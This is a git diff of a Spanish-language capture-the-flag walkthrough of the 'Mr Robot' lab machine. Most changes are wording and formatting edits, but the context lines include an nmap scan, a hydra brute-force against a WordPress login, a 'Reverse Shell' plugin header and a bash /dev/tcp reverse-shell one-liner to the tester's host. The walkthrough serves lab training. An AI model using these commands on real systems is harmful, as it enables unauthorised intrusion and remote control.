@@ -28,9 +28,7 @@ ping -c 1 10.10.78.104
 
 **Si el ttl=63 es Linux**
 
-### NMAP
-
-El comando que usaremos siempre con nmap es:
+Usaremos nmap, con el siguiente comando:
 
 ```
 sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.10.78.104
@@ -63,7 +61,7 @@ http://10.10.78.104:443/
 <img src="images/bad_request.png" width="600" alt="Resultado de Nmap">
 </p>
 
-Nos dice que añadamos **HTTPS** al url, por tanto:
+Añadimos **HTTPS** al url, por tanto:
 
 ```
 https://10.10.78.104:443/
@@ -118,6 +116,8 @@ http://10.10.78.104/key-1-of-3.txt
 <img src="images/primeraRedFlag.png" width="600" alt="Resultado de Nmap">
 </p>
 
+**Nos encontramos nuestra primera bandera**
+
 Además, me encuentro un diccionario
 
 ```
@@ -127,7 +127,7 @@ http://10.10.78.104/fsocity.dic
 <img src="images/diccionario.png" width="600" alt="Resultado de Nmap">
 </p>
 
-### A continuación voy a explicar dos formas de conseguir el usuario y contraseña para el loging de Wordpress
+### A continuación voy a explicar dos formas de como conseguir el usuario y contraseña para el loging de Wordpress
 
 ### Primera forma:
 
@@ -213,14 +213,14 @@ hydra -l elliot -P fsocity.dic 10.10.224.56 http-post-form "/wp-login/:log=^USER
 <img src="images/hydra1.png" width="600" alt="Resultado de Nmap">
 </p>
 
+**Lo malo, es que te tarda bastante en sacarte la contraseña, ya que el diccionario es muuuuuuuuuuuuuuuuuuy, más de 15 minutos tarda**
+
 No olvidemos de ir a **Settings - en el buscador (proxy) - Settings - No proxy**
 Sino, no nos funcionará la página.
 
 <p align="center"> 
 <img src="images/proxy2.png" width="600" alt="Resultado de Nmap">
 </p>
-
-**Lo malo, es que te tarda bastante en sacarte la contraseña, ya que el diccionario es muuuuuuuuuuuuuuuuuuy, más de 15 minutos tarda**
 
 ### Segunda forma:
 
@@ -322,6 +322,7 @@ Luego ese fichero que nos hemos traído al escritorio hay que editarlo para que 
 
 **Es muy importante, añadir lo que hemos señalado porque sino wordpress no nos dejará subir el plugins**
 
+```
 /*
 Plugin Name: Reverse Shell
 Plugin URI: http://shell.com
@@ -332,6 +333,7 @@ Author URI: http://www.me.com
 Text Domain: shell
 Domain Path: /languages
 */
+```
 
 Lo siguiente sirve para prepara restablecer la shell de la maquina objetivo en nuestra kali, en mi caso, sería así:
 
@@ -382,7 +384,7 @@ bash -c "sh -i >& /dev/tcp/10.8.139.36/4444 0>&1"
 <img src="images/conexion_estable.png" width="600" alt="Resultado de Nmap">
 </p>
 
-## Tratamiento de la TTY
+### Tratamiento de la TTY
 
 ```
 script /dev/null -c bash
@@ -395,7 +397,7 @@ reset xterm
 export TERM=xterm
 export SHELL=bash
 ```
-## Sino funciona la TTY tenemos la alternativa de Python
+### Sino funciona la TTY tenemos la alternativa de Python
 
 En alternativa de la tty, usaremos este comando:
 
@@ -406,6 +408,8 @@ python -c "import pty;pty.spawn('/bin/bash')"
 <p align="center"> 
 <img src="images/python.png" width="600" alt="Resultado de Nmap">
 </p>
+
+-------------------------------------------------------
 
 Nos situamos en /home/robot
 
@@ -456,6 +460,8 @@ abcdefghijklmnopqrstuvwxyz
 <img src="images/2redflag.png" width="600" alt="Resultado de Nmap">
 </p>
 
+**Segunda bandera conseguida**
+
 # Escalada de Privilegios
 
 Realizamos el siguiente comando:
@@ -499,6 +505,8 @@ cat key-3-of-3.txt
 <p align="center"> 
 <img src="images/3redflag.png" width="600" alt="Resultado de Nmap">
 </p>
+
+**Tercera bandera conseguida**
 
 
 
